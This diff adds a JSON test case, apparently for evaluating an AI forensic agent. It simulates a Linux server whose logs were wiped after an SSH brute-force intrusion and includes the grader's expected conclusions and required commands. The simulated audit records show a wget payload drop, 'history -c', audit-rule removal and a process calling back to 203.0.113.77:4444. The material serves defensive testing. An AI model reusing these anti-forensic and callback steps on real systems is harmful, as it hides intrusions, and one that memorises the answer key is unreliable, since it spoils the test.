@@ -1,0 +1,212 @@
+{
+  "id": "logs-wiped",
+  "title": "日志被清空：必须切换到替代证据源",
+  "category": "boundary",
+  "investigation_mode": "free_form",
+  "clients": [
+    {
+      "id": "1",
+      "os": "linux/amd64",
+      "address": "203.0.113.52:39771",
+      "online": true,
+      "note": "web02",
+      "host": {
+        "hostname": "web02",
+        "now": "2026-06-02T09:00:00+08:00",
+        "timezone": "Asia/Shanghai",
+        "timezone_name": "CST",
+        "uname": "Linux web02 3.10.0-1160.71.1.el7.x86_64 #1 SMP Tue Jun 28 15:37:28 UTC 2022 x86_64 GNU/Linux",
+        "uptime": " 09:00:02 up 219 days,  4:12,  1 user,  load average: 1.02, 0.97, 0.90",
+        "wtmp_begins": "Sun May  3 03:00:02 2026",
+        "files": [
+          {
+            "path": "/var/log/nginx/access.log",
+            "user": "root",
+            "size": 0,
+            "mtime": "2026-06-02T01:57:44+08:00",
+            "ctime": "2026-06-02T01:57:44+08:00",
+            "atime": "2026-06-02T01:57:44+08:00",
+            "file_type": "empty",
+            "lines": []
+          },
+          {
+            "path": "/var/log/secure",
+            "user": "root",
+            "mode": "-rw-------",
+            "size": 0,
+            "mtime": "2026-06-02T01:57:51+08:00",
+            "ctime": "2026-06-02T01:57:51+08:00",
+            "atime": "2026-06-02T01:57:51+08:00",
+            "file_type": "empty",
+            "lines": []
+          },
+          {
+            "path": "/var/log/messages",
+            "user": "root",
+            "size": 0,
+            "mtime": "2026-06-02T01:57:55+08:00",
+            "ctime": "2026-06-02T01:57:55+08:00",
+            "atime": "2026-06-02T01:57:55+08:00",
+            "file_type": "empty",
+            "lines": []
+          },
+          {
+            "path": "/root/.bash_history",
+            "user": "root",
+            "mode": "-rw-------",
+            "size": 0,
+            "mtime": "2026-06-02T01:58:12+08:00",
+            "ctime": "2026-06-02T01:58:12+08:00",
+            "atime": "2026-06-02T01:58:12+08:00",
+            "file_type": "empty",
+            "lines": []
+          },
+          {
+            "path": "/var/log/audit/audit.log",
+            "user": "root",
+            "mode": "-rw-------",
+            "mtime": "2026-06-02T08:59:00+08:00",
+            "lines": [
+              "type=USER_LOGIN msg=audit(1780349460.221:20114): pid=4102 uid=0 msg='op=login acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=203.0.113.77 res=success'",
+              "type=EXECVE msg=audit(1780349533.117:20140): argc=3 a0=\"/usr/bin/wget\" a1=\"-qO\" a2=\"/dev/shm/.sysd\"",
+              "type=EXECVE msg=audit(1780349541.902:20146): argc=2 a0=\"/usr/bin/chmod\" a1=\"+x\"",
+              "type=EXECVE msg=audit(1780349550.410:20151): argc=1 a0=\"/dev/shm/.sysd\"",
+              "type=EXECVE msg=audit(1780349880.775:20233): argc=2 a0=\"/usr/bin/history\" a1=\"-c\"",
+              "type=CONFIG_CHANGE msg=audit(1780349905.118:20240): op=remove_rule key=\"log-watch\" res=1"
+            ]
+          },
+          {
+            "path": "/proc/4412/exe",
+            "kind": "link",
+            "user": "root",
+            "symlink_target": "/dev/shm/.sysd (deleted)",
+            "mtime": "2026-06-02T01:32:30+08:00",
+            "ctime": "2026-06-02T01:32:30+08:00"
+          },
+          {
+            "path": "/proc/4412/cwd",
+            "kind": "link",
+            "user": "root",
+            "symlink_target": "/dev/shm",
+            "mtime": "2026-06-02T01:32:30+08:00",
+            "ctime": "2026-06-02T01:32:30+08:00"
+          },
+          {
+            "path": "/proc/4412/cmdline",
+            "user": "root",
+            "mtime": "2026-06-02T01:32:30+08:00",
+            "lines": [
+              "/dev/shm/.sysd -c 203.0.113.77:4444 -k 9f21ac"
+            ]
+          },
+          {
+            "path": "/proc/4412/environ",
+            "user": "root",
+            "mode": "-r--------",
+            "mtime": "2026-06-02T01:32:30+08:00",
+            "lines": [
+              "PWD=/dev/shm",
+              "SSH_CLIENT=203.0.113.77 51882 22",
+              "SSH_CONNECTION=203.0.113.77 51882 10.0.5.14 22"
+            ]
+          }
+        ],
+        "processes": [
+          {"pid": 1, "ppid": 0, "user": "root", "cpu": 0.0, "mem": 0.1, "vsz": 191216, "rss": 4102, "stat": "Ss", "start": "2025", "time": "18:22", "cmd": "/usr/lib/systemd/systemd --switched-root --system"},
+          {"pid": 880, "ppid": 1, "user": "root", "cpu": 0.0, "mem": 0.1, "vsz": 112904, "rss": 4288, "stat": "Ss", "start": "2025", "time": "0:31", "cmd": "/usr/sbin/sshd -D"},
+          {"pid": 1010, "ppid": 1, "user": "root", "cpu": 0.0, "mem": 0.2, "vsz": 125412, "rss": 6180, "stat": "Ss", "start": "2025", "time": "3:44", "cmd": "nginx: master process /usr/sbin/nginx"},
+          {"pid": 4102, "ppid": 880, "user": "root", "cpu": 0.0, "mem": 0.1, "vsz": 116104, "rss": 5120, "stat": "Ss", "start": "01:31", "time": "0:00", "cmd": "sshd: root@pts/1"},
+          {"pid": 4412, "ppid": 1, "user": "root", "cpu": 2.4, "mem": 0.6, "vsz": 421104, "rss": 24880, "stat": "Ssl", "start": "01:32", "time": "0:09", "cmd": "/dev/shm/.sysd -c 203.0.113.77:4444 -k 9f21ac"}
+        ],
+        "connections": [
+          {"proto": "tcp", "local": "0.0.0.0:22", "remote": "0.0.0.0:*", "state": "LISTEN", "pid": 880, "program": "sshd"},
+          {"proto": "tcp", "local": "0.0.0.0:80", "remote": "0.0.0.0:*", "state": "LISTEN", "pid": 1010, "program": "nginx"},
+          {"proto": "tcp", "local": "10.0.5.14:22", "remote": "203.0.113.77:51882", "state": "ESTABLISHED", "pid": 4102, "program": "sshd"},
+          {"proto": "tcp", "local": "10.0.5.14:47702", "remote": "203.0.113.77:4444", "state": "ESTABLISHED", "pid": 4412, "program": ".sysd"}
+        ],
+        "logins": [
+          {"user": "root", "tty": "pts/1", "from": "203.0.113.77", "start": "Tue Jun  2 01:31", "end": "still logged in", "duration": "07:29"},
+          {"user": "ops", "tty": "pts/0", "from": "10.0.0.9", "start": "Mon Jun  1 17:20", "end": "18:02", "duration": "00:42"}
+        ],
+        "failed_logins": [
+          {"user": "root", "tty": "ssh:notty", "from": "203.0.113.77", "start": "Tue Jun  2 01:28", "end": "01:28", "duration": "00:00"},
+          {"user": "root", "tty": "ssh:notty", "from": "203.0.113.77", "start": "Tue Jun  2 01:29", "end": "01:29", "duration": "00:00"},
+          {"user": "admin", "tty": "ssh:notty", "from": "203.0.113.77", "start": "Tue Jun  2 01:29", "end": "01:29", "duration": "00:00"},
+          {"user": "root", "tty": "ssh:notty", "from": "203.0.113.77", "start": "Tue Jun  2 01:30", "end": "01:30", "duration": "00:00"}
+        ],
+        "crontabs": {
+          "root": []
+        },
+        "package_verify": [],
+        "journal_begins": "unavailable"
+      }
+    }
+  ],
+  "faults": [
+    {
+      "type": "error",
+      "match": "^journalctl",
+      "exit_code": 1,
+      "stderr": "Failed to open journal: No such file or directory",
+      "times": 0
+    }
+  ],
+  "expectation": {
+    "verdict": "confirmed_intrusion_with_antiforensics",
+    "confidence_ceiling": "confirmed",
+    "must_conclude": [
+      "主日志（access.log / secure / messages / bash_history）被清空至 0 字节，journal 已不可读，日志清除本身是攻击者行为（T1070.002、T1070.003）",
+      "改用替代证据源仍可定案：wtmp 保留 203.0.113.77 的 root 登录，btmp 保留同源暴破失败记录，审计日志保留 wget 落地与 .sysd 执行记录",
+      "/proc/4412/exe 指向已删除的 /dev/shm/.sysd，进程仍在运行并与 203.0.113.77:4444 保持外联",
+      "入侵路径：SSH 暴破成功（01:28-01:31）→ wget 落地 /dev/shm/.sysd → 执行并外联 → 清日志"
+    ],
+    "must_not_conclude": [
+      "因主日志为空就写「证据不足，无法调查」",
+      "把日志清空归因为日志轮转或运维操作（审计日志有 history -c 与删审计规则记录）",
+      "在没有替代证据的部分强行补全时间线"
+    ],
+    "required_evidence": [
+      {
+        "client": "1",
+        "command": "wc -l /var/log/nginx/access.log /var/log/secure /var/log/messages",
+        "must_contain": ["0 /var/log/nginx/access.log", "0 /var/log/secure", "0 /var/log/messages"]
+      },
+      {
+        "client": "1",
+        "command": "stat /root/.bash_history",
+        "must_contain": ["Size: 0", "Change: 2026-06-02 01:58:12"]
+      },
+      {
+        "client": "1",
+        "command": "last -n 10",
+        "must_contain": ["203.0.113.77", "root", "pts/1"]
+      },
+      {
+        "client": "1",
+        "command": "lastb -n 10",
+        "must_contain": ["203.0.113.77", "ssh:notty"]
+      },
+      {
+        "client": "1",
+        "command": "grep -n 'EXECVE' /var/log/audit/audit.log",
+        "must_contain": ["/usr/bin/wget", "/dev/shm/.sysd", "/usr/bin/history"]
+      },
+      {
+        "client": "1",
+        "command": "ls -l /proc/4412/exe",
+        "must_contain": ["/dev/shm/.sysd (deleted)"]
+      },
+      {
+        "client": "1",
+        "command": "cat /proc/4412/cmdline",
+        "must_contain": ["203.0.113.77:4444"]
+      },
+      {
+        "client": "1",
+        "command": "netstat -antp",
+        "must_contain": ["203.0.113.77:4444", "4412/.sysd", "203.0.113.77:51882"]
+      }
+    ],
+    "notes": "负向能力用例：主日志被清空。正确行为是切换到 wtmp / btmp / 审计日志 / 进程内存痕迹并把清日志本身写成攻击者行为，而不是停在「无日志无法判断」。注入的 journalctl 错误用于验证命令级失败不会被当成工具级失败。"
+  }
+}
